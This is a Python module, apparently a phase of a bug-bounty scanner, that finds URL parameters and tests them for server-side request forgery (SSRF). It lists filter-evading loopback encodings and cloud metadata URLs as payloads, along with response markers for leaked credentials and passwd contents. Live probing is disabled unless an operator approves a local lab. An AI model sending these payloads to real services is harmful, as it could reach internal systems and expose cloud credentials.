"""
Phase: waf_evasion_ssrf

When a parameter accepts URLs (?url=, ?webhook=, ?callback=, ?image=, ...),
naive filters block "127.0.0.1" and "localhost" but miss alternative IP
encodings. This phase tests:

  - Decimal IP:    http://2130706433/                      (= 127.0.0.1)
  - Octal IP:      http://0177.0.0.1/                      (= 127.0.0.1)
  - Hex IP:        http://0x7f000001/                      (= 127.0.0.1)
  - IPv6 loopback: http://[::1]/
  - DNS abuse:     http://localtest.me/                    (resolves to 127.0.0.1)
  - AWS metadata:  http://169.254.169.254/latest/meta-data/

Gentle: 1 request per encoding × max 6 encodings × max 20 URL params per
host = ~120 requests/host worst case, paced via anti_block.

NEVER attempts to retrieve sensitive metadata if the SSRF works (no further
exfil). Just confirms reachability via response signals.
"""
from __future__ import annotations
import re
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from core import anti_block, noise_filter, fp_engine
from core.targets import get_root_domains
from core.safe_writes import gate as write_gate

try:
    import requests
except ImportError:
    requests = None


# (encoding_id, payload_url, description)
SSRF_ENCODINGS = [
    ("decimal_loopback",  "http://2130706433/",            "decimal-encoded 127.0.0.1"),
    ("octal_loopback",    "http://0177.0.0.1/",            "octal-encoded 127.0.0.1"),
    ("hex_loopback",      "http://0x7f000001/",            "hex-encoded 127.0.0.1"),
    ("ipv6_loopback",     "http://[::1]/",                 "IPv6 loopback"),
    ("dns_loopback",      "http://localtest.me/",          "DNS-resolves-to-127.0.0.1"),
    ("dns_127",           "http://127.0.0.1.nip.io/",      "wildcard DNS to loopback"),
    ("aws_metadata",      "http://169.254.169.254/latest/meta-data/",
                          "AWS instance metadata (CRITICAL if reachable)"),
    ("gcp_metadata",      "http://metadata.google.internal/computeMetadata/v1/",
                          "GCP metadata (CRITICAL if reachable)"),
    ("azure_metadata",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                          "Azure metadata"),
]

# Parameter names that frequently accept URLs (high-value targets)
URL_PARAM_NAMES_RE = re.compile(
    r"^(url|target|dest|destination|redirect|redirect_url|redirect_uri|"
    r"return|return_url|returnurl|callback|callback_url|webhook|webhook_url|"
    r"link|src|source|next|continue|forward|image|img|file|path|"
    r"feed|host|domain|fetch|proxy)$",
    re.I,
)


def run(ctx):
    """Classify candidates unless an operator approved *local laboratory* OAST.

    Historical embedded metadata/loopback payloads remain in the source for
    compatibility/reference, but must not be sent to live bounty targets.
    This phase cannot infer permission to test internal/cloud services from a
    domain allowance or a general active-probe profile.
    """
    import json
    import ipaddress
    from pathlib import Path
    from core.targets import target_scope_allows

    candidates = _collect_candidates(ctx)
    if not candidates:
        ctx.log('INFO', 'waf_evasion_ssrf', 'no URL parameter candidates')
        return
    profile = ctx.profile if isinstance(ctx.profile, dict) else {}
    lab_approved = profile.get('ssrf_local_oast_approved') is True
    offline = bool(getattr(ctx.args, 'offline', False))
    pending = []
    runnable = []
    for url, param in candidates[:40]:
        try:
            host = urlparse(url).hostname or ''
            local = ipaddress.ip_address(host).is_loopback
        except (ValueError, TypeError):
            local = False
        if lab_approved and not offline and local and target_scope_allows(ctx, url):
            runnable.append((url, param))
        else:
            pending.append({'url': url, 'parameter': param, 'status': 'requires_explicit_local_lab_approval',
                            'reason': 'potential SSRF sink; no authority to probe internal/metadata destinations'})
    directory = ctx.output / 'evidence'
    directory.mkdir(parents=True, exist_ok=True)
    (directory / 'ssrf_candidate_review.json').write_text(json.dumps({
        'schema': 'tbhm.ssrf-review/1', 'not_tested': pending,
        'local_lab_approved': lab_approved, 'offline': offline,
        'note': 'Discovered URL parameters are hypotheses, not verified SSRF. '
                'No internal-IP, instance-metadata, or public callback probes are dispatched.'
    }, indent=2), encoding='utf-8')
    if not runnable:
        ctx.log('INFO', 'waf_evasion_ssrf', f'{len(pending)} candidates require independent authorization; zero SSRF probe traffic')
        return
    if not requests:
        ctx.log('WARN', 'waf_evasion_ssrf', 'requests unavailable, no local laboratory experiment')
        return
    from core.oast import LocalOAST
    with LocalOAST(ctx.output, approved=True, offline=False, max_challenges=2*len(runnable)) as oracle:
        for index, (url, param) in enumerate(runnable):
            test_id = 'local-ssrf-' + str(index)
            refs = [oracle.issue(test_id=test_id, role=role) for role in ('mutation', 'repeat')]
            for ref in refs:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [ref['url']]
                crafted = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
                try:
                    # Requests are still subject to the normal active scope/HTTP guard.
                    requests.get(crafted, timeout=5, allow_redirects=False)
                except requests.RequestException:
                    pass
            observation = oracle.result(test_id)
            observation['tested_url'] = url
            observation['parameter'] = param
            observation['validation_state'] = 'supported_candidate_requires_manual_review' if observation['callbacks_observed'] == 2 else 'inconclusive'
            ctx.storage.save_observation(phase='waf_evasion_ssrf', observation_type='controlled_local_oast',
                                         target=url, summary=observation['validation_state'], evidence=observation)
    artifact = oracle.export()
    ctx.log('OK', 'waf_evasion_ssrf', f'local OAST session exported: {artifact.name}; callbacks are not auto-confirmed')


def _collect_candidates(ctx) -> list[tuple[str, str]]:
    """Return [(url, param_name), ...] for URL-taking parameters."""
    out = set()
    crawl_file = ctx.output / "recon" / "crawl_urls.txt"
    if crawl_file.exists():
        for url in ctx.runner.read_lines(crawl_file):
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                if URL_PARAM_NAMES_RE.match(param):
                    out.add((url, param))
    # Also try alive endpoints w/ guess-params
    alive_file = ctx.output / "recon" / "alive.txt"
    if alive_file.exists():
        for url in ctx.runner.read_lines(alive_file)[:30]:
            # Try the most common URL-param name
            for guess in ("url", "redirect", "callback", "image"):
                out.add((url, guess))
    return list(out)


def _probe_param(ctx, url: str, param: str) -> int:
    """Send each SSRF encoding through the parameter; report on signals."""
    raise PermissionError("Legacy internal/metadata SSRF probes are disabled; use approved local OAST via run()")
    host = urlparse(url).hostname or ""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # 1. Baseline: send with a benign URL to learn normal response time
    qs_baseline = {k: v for k, v in qs.items()}
    qs_baseline[param] = ["http://example.com/"]
    baseline_url = parsed._replace(query=urlencode(qs_baseline, doseq=True)).geturl()
    try:
        t0 = time.time()
        r_base = requests.get(baseline_url, headers=anti_block.headers_for(host),
                              timeout=15, verify=False)
        t_base = time.time() - t0
        anti_block.observe(host, r_base.status_code, len(r_base.content))
        base_len = len(r_base.content)
    except Exception:
        return 0
    time.sleep(anti_block.next_delay(host))

    n = 0
    for enc_id, payload, description in SSRF_ENCODINGS:
        qs2 = {k: v for k, v in qs.items()}
        qs2[param] = [payload]
        target_url = parsed._replace(query=urlencode(qs2, doseq=True)).geturl()
        try:
            t0 = time.time()
            r = requests.get(target_url, headers=anti_block.headers_for(host),
                              timeout=15, verify=False)
            t_taken = time.time() - t0
            anti_block.observe(host, r.status_code, len(r.content), r.text[:1000])
        except Exception:
            continue
        time.sleep(anti_block.next_delay(host))

        # FP filter: response is WAF block page?
        waf = fp_engine.waf_fingerprint(dict(r.headers), r.text[:5000])
        if waf["is_waf"]:
            continue

        # Signals that indicate SSRF success:
        #  A) Response length significantly different (got internal content)
        #  B) Body contains metadata-like fields ('iam', 'instance-id', 'ami-id')
        #  C) Response time much higher (internal resolution attempt)
        len_diff_pct = abs(len(r.content) - base_len) / max(base_len, 1)

        metadata_hit = False
        body_lower = r.text[:8000].lower() if r.text else ""
        for marker in ("ami-id", "instance-id", "iam/security-credentials",
                       "computemetadata", "x-aws-ec2-metadata-token",
                       "ec2 instance", "root:x:0:0:",
                       "\"accesskeyid\"", "\"secretaccesskey\""):
            # v2.20: removed generic "127.0.0.1"/"localhost:" — they appear in
            # benign JS bundles and caused CRITICAL SSRF false positives on SPAs.
            if marker in body_lower:
                metadata_hit = True
                break

        # Signal scoring
        signals = {
            "baseline_differs": len_diff_pct > 0.20,
            "differential_response": metadata_hit,
            "waf_blocked": waf["is_waf"],
            "third_party_host": False,
        }
        score = fp_engine.confidence_score(signals)

        # v2.20: length-differential ALONE is unreliable on dynamic/SPA pages
        # (per-request nonces change the body size). Only a cloud-metadata marker
        # justifies a severe finding. Length-only → LOW + LOW confidence, and only
        # when the delta is large. Everything else is dropped.
        if metadata_hit:
            sev = "CRITICAL"
            conf = "HIGH"
        elif len_diff_pct > 0.60 and r.status_code == 200:
            sev = "LOW"
            conf = "LOW"
        else:
            continue

        ctx.save_finding({
            "phase": "waf_evasion_ssrf", "severity": sev,
            "confidence": conf,
            "title": f"Possible SSRF via {enc_id} on param '{param}'",
            "target": host, "url": target_url, "method": "GET",
            "parameter": param, "payload": payload,
            "evidence": (
                f"Baseline (benign URL) → {base_len} bytes in {t_base:.2f}s. "
                f"SSRF probe ({description}) → {len(r.content)} bytes in {t_taken:.2f}s. "
                f"Length Δ {len_diff_pct*100:.1f}%. "
                + ("Metadata marker found in body." if metadata_hit else "")
            ),
            "description": "A parameter that accepts URLs returned a different response "
                          "for an internal-IP-encoded variant than for a benign URL. "
                          "This suggests the server-side fetcher accepted the encoded "
                          "internal IP and attempted to fetch it.",
            "impact": ("Server reached internal cloud metadata service — possible "
                       "credentials theft." if metadata_hit else
                       "Possible SSRF to internal services. Manually verify with OOB."),
            "remediation": "Parse the URL parameter, resolve the hostname server-side, "
                          "and reject if the resolved IP is in private/loopback/"
                          "metadata ranges (RFC1918, 127/8, 169.254/16, [::1], etc.).",
            "cwe": "CWE-918", "mrs_score": 90 if metadata_hit else 65,
        })
        n += 1
        if n >= 2:    # cap findings per param
            break
    return n
